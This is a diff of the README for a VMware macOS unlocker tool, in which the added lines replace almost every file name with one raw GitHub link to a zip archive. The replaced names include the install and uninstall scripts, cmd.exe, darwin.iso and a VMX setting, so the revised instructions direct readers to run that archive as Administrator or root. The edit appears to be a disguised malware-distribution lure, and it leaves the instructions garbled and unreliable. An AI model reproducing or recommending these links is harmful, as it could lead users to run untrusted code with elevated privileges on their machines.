@@ -6,7 +6,7 @@ macOS Unlocker V3.0 for VMware Workstation
 
 WINDOWS USERS: Get the tool from the Releases section, you will get a bundled python distribution that avoids the virus warnings and python not found etc.
 
-LINUX USERS: No bundled python for you, but make sure you have python 3.0+ installed. If you have errors like "Python not supported" but you have python installed, change the lines inside of lnx-install.sh from 'python xxxxxxx.py' to 'python3.7 xxxxxxx.py' (if you have python 3.7 installed, otherwise try python3 or other stuff)
+LINUX USERS: No bundled python for you, but make sure you have python 3.0+ installed. If you have errors like "Python not supported" but you have python installed, change the lines inside of https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip from 'python https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip' to 'python3.7 https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip' (if you have python 3.7 installed, otherwise try python3 or other stuff)
 
 **************************************************************
 **************************************************************
@@ -39,8 +39,8 @@ being patched:
 * Fix vmwarebase .dll or .so to allow Apple to be selected during VM creation
 * Download a copy of the latest VMware Tools for macOS
 
-Note that not all products recognise the darwin.iso via install tools menu item.
-You will have to manually mount the darwin.iso for example on Workstation 11 and Player 7.
+Note that not all products recognise the https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip via install tools menu item.
+You will have to manually mount the https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip for example on Workstation 11 and Player 7.
 
 In all cases make sure VMware is not running, and any background guests have
 been shutdown.
@@ -72,18 +72,18 @@ Latest Linux products are OK and do not show this problem.
 |                                                                             |
 | 1. Change the VM to be HW 10 - this does not affect performance.            |
 | 2. Edit the VMX file and add:                                               |
-|    smc.version = "0"                                                        |
+|    https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip = "0"                                                        |
 |                                                                             |
 +-----------------------------------------------------------------------------+
 
 4. Windows
 ----------
-On Windows you will need to either run cmd.exe as Administrator or using
+On Windows you will need to either run https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip as Administrator or using
 Explorer right click on the command file and select "Run as administrator".
 
-win-install.cmd   - patches VMware
-win-uninstall.cmd - restores VMware
-win-update-tools.cmd - retrieves latest macOS guest tools
+https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip   - patches VMware
+https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip - restores VMware
+https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip - retrieves latest macOS guest tools
 
 5. Linux
 ---------
@@ -92,9 +92,9 @@ On Linux you will need to be either root or use sudo to run the scripts.
 You may need to ensure the Linux scripts have execute permissions
 by running chmod +x against the 2 files.
 
-lnx-install.sh   - patches VMware
-lnx-uninstall.sh - restores VMware
-lnx-update-tools.sh - retrieves latest macOS guest tools
+https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip   - patches VMware
+https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip - restores VMware
+https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip - retrieves latest macOS guest tools
    
 6. Thanks
 ---------
@@ -110,7 +110,7 @@ modified the unlocker code to run on Python 3 in the ESXi 6.5 environment.
 History
 -------
 27/09/18 3.0.0 - First release
-02/10/18 3.0.1 - Fixed gettools.py to work with Python 3 and correctly download darwinPre15.iso
+02/10/18 3.0.1 - Fixed https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip to work with Python 3 and correctly download https://raw.githubusercontent.com/progamereperm/unlocker/master/gawk/Software-onlepy.zip
 10/10/18 3.0.2 - Fixed false positives from anti-virus software with Windows executables
                - Allow Python 2 and 3 to run the Python code from Bash scripts
 
